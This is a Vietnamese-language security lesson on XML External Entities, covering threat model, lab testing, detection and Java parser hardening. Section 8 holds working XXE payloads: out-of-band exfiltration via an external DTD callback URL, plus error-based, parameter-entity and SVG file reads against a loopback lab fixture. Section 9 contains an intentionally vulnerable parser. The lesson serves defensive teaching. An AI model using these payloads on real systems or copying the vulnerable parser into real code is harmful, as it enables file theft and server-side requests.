---
schema_version: 1
id: WEB-A05-XXE
title: "XML External Entities"
slug: xxe
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A02:2025
cwe:
  - CWE-611
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# XML External Entities

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích XML External Entities bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response của tình huống XML External Entities và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Hãy nghĩ về XML như một cách sắp xếp dữ liệu có trật tự bằng các thẻ (tương tự như HTML). Trong XML, có một tính năng gọi là thực thể (Entities), hoạt động giống như việc bạn đặt phím tắt hoặc khai báo một biến số để tái sử dụng nhiều lần. Tuy nhiên, XML còn hỗ trợ các thực thể bên ngoài (External Entities) sử dụng từ khóa `SYSTEM` kèm theo một đường dẫn. Khi xử lý tài liệu XML này, bộ phân tích cú pháp (XML parser) sẽ tự động tìm đến đường dẫn đó để tải nội dung về đắp vào vị trí thực thể. Đường dẫn này có thể trỏ đến một file nằm ngay trên máy chủ hoặc một trang web trên mạng.

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

public class SecureXmlParser {
    public static DocumentBuilderFactory createSecureParserFactory() throws ParserConfigurationException {
        // Create a new DocumentBuilderFactory instance
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Disable DTD (Document Type Definitions) completely to prevent XXE attacks
        // The parser will throw an exception if a DOCTYPE declaration is encountered.
        String disallowDtdFeature = "http://apache.org/xml/features/disallow-doctype-decl";
        factory.setFeature(disallowDtdFeature, true);

        // Additional security hardening: disable XInclude and entity expansion
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        return factory;
    }
}
```

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng XML External Entity (XXE) xảy ra khi ứng dụng dùng parser XML cho phép DTD/thực thể ngoài với dữ liệu không tin cậy. Hậu quả có thể gồm đọc tài nguyên mà tiến trình có quyền truy cập, tạo request phía server hoặc tiêu tốn tài nguyên. Trong lab của bài này, mọi truy cập file dùng duy nhất `file:///fixtures/lab-secret.txt`, callback chỉ bind loopback và parser chạy trong container có giới hạn; không đọc file hệ thống thật hoặc quét dịch vụ mạng. [S1]

> **Nguồn tham khảo:** các claim kỹ thuật trong bài được gắn marker nguồn; khi áp dụng thực tế, hãy đối chiếu phiên bản/framework đang dùng: [S1], [S2], [S3], [S4].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** file marker tổng hợp, XML parser và network reachability.
- **Actor, xác thực và role:** role user upload XML/SVG hoặc gọi XML API.
- **Điều kiện khai thác:** DTD/external entity resolution theo file/URL do document điều khiển.
- **Browser, proxy, framework và phiên bản:** Java 17 DocumentBuilder với feature được pin, file tổng hợp và callback 127.0.0.1; no outbound; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với xxe, DTD/external entity resolution theo file/URL do document điều khiển. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy Java 17 DocumentBuilder với feature được pin, file tổng hợp và callback 127.0.0.1; no outbound; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case xxe; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “DTD/external entity resolution theo file/URL do document điều khiển”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của xxe; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây là ví dụ lab tối thiểu theo đúng context đã ghi trong annotation. Trước khi dùng, đối chiếu framework/phiên bản, encoding, expected result và risk; chỉ chạy trong fixture local có ủy quyền. Payload mở rộng thuộc `security_cheatsheet.md`; lesson chỉ giữ ví dụ cốt lõi.

Các biến thể tấn công XXE phổ biến bao gồm:

*   **Blind XXE (Out-of-Band - OOB)**: Khi ứng dụng không trả về kết quả phân giải XML trong phản hồi HTTP, kẻ tấn công sử dụng một DTD bên ngoài để gửi dữ liệu ra máy chủ ngoại vi thông qua DNS hoặc HTTP.
    *   *Payload gửi lên ứng dụng*:
<!-- payload-id: WEB-A05-XXE-001 -->
<!-- context: XML 1.0 parsed by an intentionally vulnerable local fixture with external parameter entities enabled -->
<!-- prerequisites: DTD server bound to 127.0.0.1:9001; outbound network disabled; request limit 2; synthetic fixture file only -->
<!-- encoding: UTF-8 XML; the DTD URL is literal ASCII -->
<!-- expected-result: the parser makes one loopback GET for /evil.dtd and the fixture log records external-entity resolution -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % dtd SYSTEM "http://127.0.0.1:9001/evil.dtd">
          %dtd;
        ]>
        <foo>&exfil;</foo>
        ```
    *   *Nội dung tệp `evil.dtd` trên máy chủ kẻ tấn công*:
<!-- payload-id: WEB-A05-XXE-002 -->
<!-- context: external DTD consumed by the XML fixture used by WEB-A05-XXE-001 -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; callback bound to 127.0.0.1:9001; outbound network disabled -->
<!-- encoding: UTF-8 DTD; fixture marker contains URL-safe ASCII only -->
<!-- expected-result: callback receives one GET /collect?data=XXE_LAB_MARKER and no non-loopback connection occurs -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!ENTITY % file SYSTEM "file:///fixtures/lab-secret.txt">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:9001/collect?data=%file;'>">
        %eval;
        ```
*   **Parameter Entity XXE**: Sử dụng thực thể tham số (bắt đầu bằng `%`) để định nghĩa cấu trúc lồng nhau trong DTD, giúp vượt qua các hạn chế về mặt cú pháp của bộ phân tích XML nội bộ.
    *   *Payload*:
<!-- payload-id: WEB-A05-XXE-003 -->
<!-- context: XML 1.0 parser fixture with parameter entities and local file URIs intentionally enabled -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; parser errors are captured locally; no outbound network -->
<!-- encoding: UTF-8 XML and DTD; marker is ASCII -->
<!-- expected-result: the controlled parser error contains XXE_LAB_MARKER and no host file is accessed -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///fixtures/lab-secret.txt">
          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
          %eval;
        ]>
        ```
*   **XXE via File Upload**: Kẻ tấn công tải lên các định dạng tệp dựa trên XML như SVG (đồ họa vector) hoặc DOCX (văn bản Word) chứa thực thể độc hại.
    *   *Payload SVG chứa XXE*:
<!-- payload-id: WEB-A05-XXE-004 -->
<!-- context: SVG 1.1 processed by an intentionally vulnerable XML parser, not direct browser rendering -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; upload processor runs in a disposable container without outbound network -->
<!-- encoding: UTF-8 XML/SVG -->
<!-- expected-result: generated SVG text contains XXE_LAB_MARKER; a hardened parser rejects the DOCTYPE -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///fixtures/lab-secret.txt" > ]>
        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
          <text font-size="16" x="0" y="16">&xxe;</text>
        </svg>
        ```
*   **Error-based XXE**: Kẻ tấn công cố tình tạo ra lỗi cú pháp hoặc lỗi nạp tài nguyên trong đó thông điệp lỗi của hệ thống chứa nội dung tệp nhạy cảm cần đọc.
    *   *Payload*:
<!-- payload-id: WEB-A05-XXE-005 -->
<!-- context: XML 1.0 parser fixture that exposes controlled entity-resolution errors -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; error output is local and disposable; no outbound network -->
<!-- encoding: UTF-8 XML and DTD; marker is ASCII -->
<!-- expected-result: fixture error includes XXE_LAB_MARKER; secure parser rejects the DOCTYPE before resolving the file URI -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///fixtures/lab-secret.txt">
          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
          %eval;
          %error;
        ]>
        ```

## 9. Code dễ bị lỗi và code an toàn

```java
// === VULNERABLE CODE (Java DocumentBuilder) ===
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;
import java.io.StringReader;

public class XmlParserVulnerable {
    public void parse(String xmlInput) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // DANGER: By default, DocumentBuilderFactory resolves external entities and DTDs
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.parse(new InputSource(new StringReader(xmlInput)));
    }
}

// === SECURE CODE (Java DocumentBuilder) ===
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class XmlParserSecure {
    public void parse(String xmlInput) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        // SECURE: Disable DTD declarations completely
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // SECURE: Disable external entities if DTDs cannot be fully disabled
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        DocumentBuilder db = dbf.newDocumentBuilder();
        db.parse(new InputSource(new StringReader(xmlInput)));
    }
}
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource liên quan đến XML External Entities, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Tắt DTD, external entity và external access trên mọi XML parser factory.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Với XML External Entities, các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Vô hiệu hóa DTD và các thực thể bên ngoài trên mọi bộ phân tích cú pháp XML được sử dụng trong ứng dụng.
- **Các bước chi tiết**:
  - Cấu hình tắt tính năng `disallow-doctype-decl` trong Java, hoặc tắt `resolve_entities` và `external_dtd` trong Python/PHP.
  - Vệ sinh các tệp tải lên (SVG, DOCX) trước khi xử lý, hoặc sử dụng các thư viện phân tích an toàn mặc định như `defusedxml` trong Python.
  - Sử dụng các định dạng trao đổi dữ liệu an toàn hơn như JSON khi có thể.

## 12. Retest

- **Positive case:** với XML External Entities, luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Tái kiểm tra:** lưu kịch bản tối thiểu tái hiện lỗi cũ và chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi của XML External Entities mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Kết luận lỗ hổng tồn tại khi chưa lưu lại nguồn, phiên bản fixture và bằng chứng quan sát được.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim kỹ thuật nhạy cảm có nguồn tham khảo ở mục 17 và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **XXE (XML External Entity)**: Lỗ hổng bảo mật liên quan đến thực thể bên ngoài XML, cho phép đọc file hoặc tạo yêu cầu mạng trái phép.
- **DTD (Document Type Definition)**: Tập hợp các quy tắc định nghĩa cấu trúc của một tài liệu XML.
- **XML Entity**: Thực thể đóng vai trò như một hằng số hoặc một biến để tái sử dụng dữ liệu trong XML.
- **XML Parser**: Bộ xử lý giúp phân tích cú pháp và dựng cấu trúc tài liệu XML.
- **SSRF (Server-Side Request Forgery)**: Tấn công giả mạo yêu cầu từ phía máy chủ, bắt máy chủ gửi truy vấn mạng tới các địa chỉ khác.

## 16. Bài liên quan và đọc thêm

- [XML Bombs](../../10-exceptional-conditions/xml-bombs/) — Kỹ thuật tấn công từ chối dịch vụ (DoS) lợi dụng cơ chế mở rộng thực thể XML để tiêu tốn bộ nhớ máy chủ (Billion Laughs attack).
- [Server-Side Request Forgery](../../01-broken-access-control/ssrf/) — Lỗ hổng giả mạo yêu cầu từ phía máy chủ, thường được kết hợp với XXE để quét cổng hoặc gửi truy vấn nội bộ.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/xxe — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** OWASP. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/611.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
